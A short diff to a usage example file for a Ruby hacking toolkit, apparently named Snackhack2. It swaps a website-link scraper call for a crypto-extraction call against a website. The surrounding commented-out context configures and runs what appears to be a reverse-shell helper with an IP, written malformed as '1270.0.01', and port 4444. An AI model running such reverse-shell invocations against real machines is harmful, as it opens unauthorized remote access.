@@ -166,6 +166,5 @@ rs.ip = "1270.0.01"
 rs.port = "4444"
 rs.run
 =end
-links = Snackhack2::WebsiteLinks.new
-links.site = "https://www.bleepingcomputer.com/news/security/signal-downplays-encryption-key-flaw-fixes-it-after-x-drama/"
-links.run
+cew = Snackhack2::CryptoExtractWebsite.new("https://encodebase64.us", save_file: true)
+cew.run
